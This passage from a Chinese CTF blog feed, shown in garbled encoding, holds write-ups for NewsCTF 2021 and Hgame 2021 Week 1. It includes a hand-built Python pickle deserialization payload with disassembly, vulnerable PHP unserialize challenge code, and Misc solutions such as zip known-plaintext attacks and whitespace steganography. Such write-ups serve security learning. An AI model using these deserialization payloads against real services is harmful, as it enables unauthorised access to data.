punctuation">)</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8081</span><span class="token punctuation">)</span></code></pre><p>åˆæ˜¯ <strong>pickle ååºåˆ—åŒ–</strong>å•¦ã€‚</p><p>å‚è€ƒ <a href="https://miaotony.xyz/2020/03/15/CTF_2020XCTF_gxzy/#webtmp">XCTFé«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ› WriteUpâ€”â€”webtmp</a> ä¸€é¢˜</p><p>è¿™é¢˜éœ€è¦ååºåˆ—åŒ–ä¹‹åçš„ name å’Œ age ä¸å¼•å…¥çš„ç›¸åŒï¼Œä½†ä¸èƒ½æŠŠ <code>Hed9eh0g_girlfriend.flag</code> ç»™è¦†ç›–æ‰ï¼Œæ‰€ä»¥ä¸èƒ½é‡‡ç”¨ è‡ªå·±é€ ä¸€ä¸ª <code>Hed9eh0g_girlfriend</code> çš„æ€è·¯ã€‚</p><p>è€Œæ˜¯åº”è¯¥åœ¨æ„é€  <code>girl</code> å¯¹è±¡å®ä¾‹åŒ–çš„æ—¶å€™å¼•å…¥ <code>Hed9eh0g_girlfriend.name</code> å’Œ <code>Hed9eh0g_girlfriend.age</code>ã€‚</p><p>åˆæ˜¯<strong>æ‰‹æ“ pickle äº†</strong>ï¼</p><pre class="language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">b'\x80\x03c__main__\ngirl\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03cHed9eh0g_girlfriend\nname\nq\x04X\x03\x00\x00\x00ageq\x05cHed9eh0g_girlfriend\nage\nq\x06ub.'</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>s<span class="token punctuation">)</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment"># gANjX19tYWluX18KZ2lybApxACmBcQF9cQIoWAQAAABuYW1lcQNjSGVkOWVoMGdfZ2lybGZyaWVuZApuYW1lCnEEWAMAAABhZ2VxBWNIZWQ5ZWgwZ19naXJsZnJpZW5kCmFnZQpxBnViLg==</span></code></pre><p>dis çœ‹ä¸€ä¸‹</p><pre class="language-python" data-language="python"><code class="language-python">    <span class="token number">0</span><span class="token punctuation">:</span> \x80 PROTO      <span class="token number">3</span>    <span class="token number">2</span><span class="token punctuation">:</span> c    GLOBAL     <span class="token string">'__main__ girl'</span>   <span class="token number">17</span><span class="token punctuation">:</span> q    BINPUT     <span class="token number">0</span>   <span class="token number">19</span><span class="token punctuation">:</span> <span class="token punctuation">)</span>    EMPTY_TUPLE   <span class="token number">20</span><span class="token punctuation">:</span> \x81 NEWOBJ   <span class="token number">21</span><span class="token punctuation">:</span> q    BINPUT     <span class="token number">1</span>   <span class="token number">23</span><span class="token punctuation">:</span> <span class="token punctuation">}</span>    EMPTY_DICT   <span class="token number">24</span><span class="token punctuation">:</span> q    BINPUT     <span class="token number">2</span>   <span class="token number">26</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>    MARK   <span class="token number">27</span><span class="token punctuation">:</span> X        BINUNICODE <span class="token string">'name'</span>   <span class="token number">36</span><span class="token punctuation">:</span> q        BINPUT     <span class="token number">3</span>   <span class="token number">38</span><span class="token punctuation">:</span> c        GLOBAL     <span class="token string">'Hed9eh0g_girlfriend name'</span>   <span class="token number">64</span><span class="token punctuation">:</span> q        BINPUT     <span class="token number">4</span>   <span class="token number">66</span><span class="token punctuation">:</span> X        BINUNICODE <span class="token string">'age'</span>   <span class="token number">74</span><span class="token punctuation">:</span> q        BINPUT     <span class="token number">5</span>   <span class="token number">76</span><span class="token punctuation">:</span> c        GLOBAL     <span class="token string">'Hed9eh0g_girlfriend age'</span>  <span class="token number">101</span><span class="token punctuation">:</span> q        BINPUT     <span class="token number">6</span>  <span class="token number">103</span><span class="token punctuation">:</span> u        SETITEMS   <span class="token punctuation">(</span>MARK at <span class="token number">26</span><span class="token punctuation">)</span>  <span class="token number">104</span><span class="token punctuation">:</span> b    BUILD  <span class="token number">105</span><span class="token punctuation">:</span> <span class="token punctuation">.</span>    STOPhighest protocol among opcodes <span class="token operator">=</span> <span class="token number">2</span></code></pre><p>ç„¶å <code>/guess?payload=xxxxx</code> æ‰“è¿‡å»å°±å¥½äº†ã€‚</p><p><code>newsctf{girlfriend?nothing!!!Affect_sword_speed}</code></p><p>å…¶å®è¿™é¢˜æ‰“æ³•åº”è¯¥æŒºå¤šçš„ï¼Œåå¼¹ shell åº”è¯¥ä¹Ÿè¡Œï¼Œä½†ä¸çŸ¥é“ä¸ºå•¥æ²¡æ‰“é€šï¼ˆï¼Ÿï¼‰</p><h3 id="EZå¥—å¨ƒ"><a href="#EZå¥—å¨ƒ" class="headerlink" title="EZå¥—å¨ƒ"></a>EZå¥—å¨ƒ</h3><blockquote><p>bugku web41 é™„é“¾æ¥ï¼š<a href="https://ctf.bugku.com/challenges/detail/id/183.html">https://ctf.bugku.com/challenges/detail/id/183.html</a></p></blockquote><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// phpç‰ˆæœ¬:5.4.44</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">evil</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$hint</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hint</span><span class="token operator">===</span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">)</span>            @<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hint</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"â•­(â—ï½€âˆ€Â´â—)â•¯"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token comment">//There's a hint in ./hint.php</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"â•°(â—â€™â—¡â€™â—)â•®"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$r</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/is'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NoNoNo!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>æ€ä¹ˆåˆæ˜¯ååºåˆ—åŒ–â€¦â€¦</p><p>ï¼ˆå¾…ç»­</p><!--## Reverse### BabyXorencrypt é•¿åº¦ 23--><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p><img src="/2021/02/11/CTF_2021NewsCTF/image-20210211180017825.png"></p><p>Misc AK äº†ï¼</p><p>å¥½å®¶ä¼™ï¼Œå¿«æ‰“ FW_Mumuzi å¸ˆå‚…ï¼Œå‡ºé¢˜è€å¥—å¨ƒäº†ï¼</p><p>Web æ€ä¹ˆå…¨æ˜¯ååºåˆ—åŒ–ï¼Œæœ‰æ¯’</p><p>BTWï¼Œè¿™ä¸ª OSINT é¢˜ç¡®å®æŒºå¥½ç©ï¼ˆ</p><p><strong>æœ¬æ–‡æœ‰å…³å†…å®¹ä»…ä¾›å­¦ä¹ ç ”ç©¶ï¼Œè¯·åœ¨åˆç†åˆæ³•èŒƒå›´å†…ä½¿ç”¨ï¼</strong></p><hr><p>ç‰›å¹´å°±è¦æ¥äº†å‘€ï¼</p><p><strong>é™¤å¤•å¿«ä¹ï¼Œæ–°å¹´å¿«ä¹å–µ~</strong></p><p><em>ï¼ˆæºœäº†æºœäº†å–µ</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 Hgame Week1 WriteUp</title>
      <link href="2021/02/07/CTF_2021HgameWeek1/"/>
      <url>2021/02/07/CTF_2021HgameWeek1/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/02/07/CTF_2021HgameWeek1/logo.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>ä¸€å¹´ä¸€åº¦ï¼Œç”±æ­å·ç”µå­ç§‘æŠ€å¤§å­¦ Vidar Team ä¸¾åŠçš„ Hgame åˆæ¥äº†ï¼</p><p>ä»Šå¹´å’Œå¾€å¹´ä¸€æ ·ï¼ŒæŒç»­å››å‘¨ï¼Œæ˜¯æ‹›æ–°èµ›ï¼Œä¸è¿‡æ„Ÿè§‰ä»Šå¹´äººæ›´å¤šäº†ã€‚</p><p>é¢˜ç›®å€’æŒºæœ‰è¶£å‘³ä¹Ÿæœ‰æ¢¯åº¦çš„ï¼Œæ­£å¥½å°±æ¥çœ‹çœ‹äº†ã€‚</p><p>è¿™ç¯‡å°±æ˜¯ç¬¬ä¸€å‘¨çš„ WriteUp å•¦ã€‚</p><blockquote><p>å…¶å®å»å¹´ä¹Ÿæ¥äº†ï¼Œä½†è²Œä¼¼çœ‹äº†ç¬¬ä¸€å‘¨åé¢å°±æ²¡æ€ä¹ˆçœ‹ï¼Œæˆ–è€…æ²¡å†™ WriteUpäº†</p><p>æƒ³å›é¡¾å¯ä»¥ç§»æ­¥ <a href="https://miaotony.xyz/2020/01/23/CTF_Hgame2020/">CTF | Hgame2020 Week1 WriteUp</a>.</p><p><em>ï¼ˆè¯´å¥½çš„ æœªå®Œå¾…ç»­ï¼Œæœç„¶å’•æ‰äº†ã€‚</em></p><p><em>åé¢å‡ å‘¨å¯èƒ½ä¹Ÿä¸ä¸€å®šæœ‰ç©ºæ¥çœ‹é¢˜äº†ï¼Œä¸çŸ¥é“èƒ½åšæŒå‡ å‘¨äº† 233</em></p></blockquote><blockquote><p><strong>å¹³å°ï¼š</strong> <a href="https://hgame.vidar.club/">https://hgame.vidar.club/</a></p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Baseå…¨å®¶ç¦"><a href="#Baseå…¨å®¶ç¦" class="headerlink" title="Baseå…¨å®¶ç¦"></a>Baseå…¨å®¶ç¦</h3><blockquote><p>æ–°å¹´å³å°†æ¥ä¸´ä¹‹é™…ï¼ŒBaseå®¶æ—ä¹Ÿå›¢èšäº†ï¼Œä»–ä»¬ç”¨ä»–ä»¬ç‰¹æœ‰çš„æ‰“æ‹›å‘¼æ–¹å¼å‘ä½ é—®äº†ä¸ªå¥½ï¼Œä½ çŸ¥é“ä»–ä»¬åœ¨è¯´ä»€ä¹ˆå—ï¼Ÿ </p><p>R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09</p></blockquote><p>è€å¥—è·¯äº†ã€‚</p><p>Base64 =&gt; Base32 =&gt; Base16/Hex</p><p><code>hgame{We1c0me_t0_HG4M3_2021}</code></p><h3 id="ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•"><a href="#ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•" class="headerlink" title="ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•"></a>ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•</h3><blockquote><p>0x4qEç»™äº†å¼ å›¾ç»™æˆ‘ï¼Œè¯´è¿™å›¾æš—è—ç„æœºï¼Œä½ èƒ½å¸®æˆ‘æ‰¾å‡ºæ¥å—ï¼Ÿ</p></blockquote><p><img src="/2021/02/07/CTF_2021HgameWeek1/0x4qE_112d64bd3834986084be726095957b5d.jpg" alt="0x4qE"></p><p>æå–æ‹¼æ¥çš„å‹ç¼©åŒ…ï¼Œå¤‡æ³¨æç¤º</p><blockquote><p>Password is picture ID (Up to 8 digits)</p></blockquote><p>ç›²çŒœæ˜¯ Pç«™æŸå¼ å›¾ç‰‡çš„IDï¼Œä¸è¿‡è¿™é‡Œæ‡’äº†ï¼Œç›´æ¥çˆ†ç ´å¥½äº†ã€‚</p><p>å¾—åˆ°å¯†ç ä¸º <code>70415155</code></p><p>è§£å‹å¾—åˆ° <code>NO PASSWORD.txt</code></p><pre class="language-none"><code class="language-none">Sometimes we don't need to care about password.Because it's too strong or null. XDBy the way, I only use storage.</code></pre><p>ä»¥åŠä¸€ä¸ª <code>plain.zip</code></p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201025347818.png"></p><p>æ˜æ–‡æ”»å‡»å•¦ã€‚</p><p>æ³¨æ„è¦å…ˆæŠŠ <code>NO PASSWORD.txt</code> æ‰“åŒ…æˆå‹ç¼©åŒ…ï¼Œä½†æ˜¯ä¸å‹ç¼©ã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201025323748.png"></p><p><code>C8uvP$DP</code></p><p>å¾—åˆ° <code>flag.zip</code>ï¼Œä¼ªåŠ å¯†ã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201025615004.png"></p><p>å…¶å®ä¸æ”¹ä¹Ÿè¡Œï¼Œæ²¡åŠ å¯†çš„æƒ…å†µä¸‹æ–‡ä»¶ååé¢è¿™æ®µå°±æ˜¯æ˜æ–‡çš„ã€‚</p><pre class="language-none"><code class="language-none">&amp;#x68;&amp;#x67;&amp;#x61;&amp;#x6D;&amp;#x65;&amp;#x7B;&amp;#x32;&amp;#x49;&amp;#x50;&amp;#x5F;&amp;#x69;&amp;#x73;&amp;#x5F;&amp;#x55;&amp;#x73;&amp;#x65;&amp;#x66;&amp;#x75;&amp;#x31;&amp;#x5F;&amp;#x61;&amp;#x6E;&amp;#x64;&amp;#x5F;&amp;#x4D;&amp;#x65;&amp;#x39;&amp;#x75;&amp;#x6D;&amp;#x69;&amp;#x5F;&amp;#x69;&amp;#x35;&amp;#x5F;&amp;#x57;&amp;#x30;&amp;#x72;&amp;#x31;&amp;#x64;&amp;#x7D;</code></pre><p>HTML å®ä½“</p><p><code>hgame{2IP_is_Usefu1_and_Me9umi_i5_W0r1d}</code></p><h3 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h3><p>ä¸‹è½½ä¸‹æ¥æµé‡åŒ…ï¼Œæå–ä¸‹å¾—åˆ°ä¸€å¼ å›¾ã€‚</p><p><em>ï¼ˆå™¢ï¼Œå‡ºé¢˜äººåœ¨ç™¾åº¦æœå›¾å•Š</em></p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201024137587.png"></p><p>æ²¡çœ‹åˆ°æœ‰æ‹¼æ¥éšå†™ï¼Œä½†æ˜¯ç»å…¸å¥—è·¯ï¼Œæ”¹é«˜åº¦å°±å¥½äº†ã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201023916817.png" alt="flag"></p><p><code>hgame{Wh4t_A_W0nderfu1_Wa11paper}</code></p><h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>è‰ï¼Œè¿™å¼ å›¾æœ‰æ¯’â€¦â€¦</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201031506012.png" alt="first"></p><p><code>first.docx</code> è—äº†ä¸€ä¸ª <code>password.xml</code></p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201030419914.png" alt="password"></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>++</span> <span class="token attr-name">+[-</span><span class="token punctuation">&gt;</span></span>+ ++<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>]</span><span class="token punctuation">&gt;</span></span> ++.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+</span> <span class="token attr-name">++[-</span><span class="token punctuation">&gt;</span></span> +++<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>]</span> <span class="token punctuation">&gt;</span></span>+.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+</span> <span class="token attr-name">++[-</span><span class="token punctuation">&gt;</span></span> ---<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>]</span> <span class="token punctuation">&gt;</span></span>-.++ ++++. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+++[</span> <span class="token attr-name">-</span><span class="token punctuation">&gt;</span></span>--- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>]</span><span class="token punctuation">&gt;</span></span>-. +++.+ .++++ ++++. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+++[</span> <span class="token attr-name">-</span><span class="token punctuation">&gt;</span></span>--- <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>]</span><span class="token punctuation">&gt;</span></span>-- ----. +.--- --..+ .++++ +++++ .<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>+++</span> <span class="token attr-name">[-</span><span class="token punctuation">&gt;</span></span>-- -<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>]</span><span class="token punctuation">&gt;</span></span>- ----- .&lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span></code></pre><p>Brainfuck è·‘ä¸€è·‘</p><p>ï¼ˆ<a href="https://fatiherikli.github.io/brainfuck-visualizer/#KysrKysgKysrWy0gPisrKysgKysrKzwgXT4rKysgKy48KysgK1stPisgKys8XT4gKysuPCsgKytbLT4gKysrPF0gPisuPCsgKytbLT4gLS0tPF0gPi0uKysgKysrKy4gPCsrK1sgLT4tLS0gPF0+LS4gKysrLisgLisrKysgKysrKy4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gKy4tLS0gLS0uLisgLisrKysgKysrKysgLjwrKysgWy0+LS0gLTxdPi0gLS0tLS0gLjw=">è¿™ä¸ªå·¥å…·</a> å¯è§†åŒ–æŒºå¥½çš„</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201030512570.png" alt="Brainfuck"></p><p><code>DOYOUKNOWHIDDEN?</code></p><p>æ‹¿å»å¼€ <code>maimai.docx</code></p><p>é‡Œé¢æœ‰å¼ å›¾ç‰‡</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/1.jpg"></p><p>å™¢ä¸å¯¹ï¼Œä¸‹é¢è¿˜æœ‰éšè—æ–‡å­—ã€‚</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201153437500.png"></p><p>è¿™é¦–æ­Œå« <strong>å¥½ãï¼é›ªï¼æœ¬æ°—ãƒã‚¸ãƒƒã‚¯</strong>ï¼ˆå§æ§½ï¼ä¸‹é›ªäº†ï¼ç‰›é€¼å•Šï¼‰</p><p>å¯ä»¥æ¥å¬ä¸€å¬ =&gt; <a href="https://music.163.com/#/search/m/?s=%E5%A5%BD%E3%81%8D%EF%BC%81%E9%9B%AA%EF%BC%81%E6%9C%AC%E6%B0%97%E3%83%9E%E3%82%B8%E3%83%83%E3%82%AF&amp;type=1">ç½‘æ˜“äº‘</a>ï¼Œ <a href="https://y.qq.com/n/yqq/song/0016KLSc0A6gyM.html">QQ éŸ³ä¹</a>ï¼Œè¿˜æŒºä¸é”™çš„ã€‚</p><p><em>ï¼ˆå½“ç„¶è¯„è®ºä¹Ÿæ²¡å•¥ä¸œè¥¿</em></p><p>Tab å’Œ ç©ºæ ¼ äº¤é”™çš„ï¼Œæ˜¯ä¸‹é¢è¿™ä¸€æ®µï¼Œ<del>ç›²çŒœæ˜¯é›¶å®½å­—ç¬¦éšå†™</del>ï¼Œä½†ä¸æ˜¯é›¶å®½å­—ç¬¦ã€‚</p><pre class="language-none"><code class="language-none">                                                                                                                                                                                                                                                                                                                                                                             </code></pre><p>è¯•ç€æŠŠ tab å½“ä½œ1ï¼Œç©ºæ ¼å½“ä½œ0</p><pre class="language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""..."""</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'\x09'</span><span class="token punctuation">:</span>        <span class="token comment"># Tab</span>        x <span class="token operator">+=</span> <span class="token string">'0'</span>    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token string">'\x20'</span><span class="token punctuation">:</span>        <span class="token comment"># Space</span>        x <span class="token operator">+=</span> <span class="token string">'1'</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># 0101101111111011011111011111011101110110111101111011110111011111110110</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 0110111111101110111101111011110110111011101111101111101101111111011010</span></code></pre><p>å†è½¬ ASCIIï¼Œå‘ç°æ˜æ˜¾ä¸å¯¹ã€‚</p><p>ç„¶åå†çœ‹å›¾ï¼Œä¸‹é›ªäº†ï¼ŒæŸ¥ä¸€ä¸‹ï¼Œå‘ç°æœç„¶æœ‰ç§ç©ºç™½å­—ç¬¦çš„éšå†™æ–¹å¼ å« SNOWã€‚</p><p>å…ˆæ˜¯çœ‹åˆ°äº† <a href="http://www.diglog.com/story/1044931.html">é›ª-ç©ºç™½éšå†™æœ¯ï¼ˆ2013ï¼‰</a> è¿™ç¯‡ä»‹ç»ã€‚</p><p>ç„¶åæ‰¾åˆ°å®˜ç½‘ <a href="http://darkside.com.au/snow/">The SNOW Home Page</a></p><blockquote><p><strong>Whitespace steganography</strong></p><p>â€‹      The program SNOW is used to conceal messages in ASCII text by      appending whitespace to the end of lines. Because spaces and tabs      are generally not visible in text viewers, the message is      effectively hidden from casual observers. And if the built-in      encryption is used, the message cannot be read even if it is detected.    </p></blockquote><p>è¿™ä¸ªåŠ å¯† 2013 å¹´åŸºäº Apache 2.0 åè®®å¯ç”¨</p><p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201194756190.png"></p><p>çœ‹äº†çœ‹æ–‡æ¡£ï¼Œå·¨å¤è€ï¼ˆ</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ SNOW.exe -C text.txthgame<span class="token punctuation">{</span>Cha11en9e_Whit3_P4ND0R4_P4R4D0XXX<span class="token punctuation">}</span></code></pre><blockquote><p><strong>Extensive Reading:</strong></p><p>BTWï¼Œé›¶å®½å­—ç¬¦éšå†™çš„</p><p>Ga1@xy å¸ˆå‚…çš„ <a href="http://www.ga1axy.top/index.php/archives/20/">æµ…è°ˆåŸºäºé›¶å®½åº¦å­—ç¬¦çš„éšå†™æ–¹å¼</a></p><p><a href="https://blog.csdn.net/Amherstieae/article/details/108909743">miscå­¦ä¹ ç¬”è®°1-txté›¶å®½åº¦å­—ç¬¦éšå†™</a></p><p><strong>Some online tools:</strong></p><p><a href="https://yuanfux.github.io/zero-width-web/">zero-width-lib</a></p><p><a href="https://offdev.net/demos/zwsp-steg-js">zwsp-steg-js</a></p><p><a 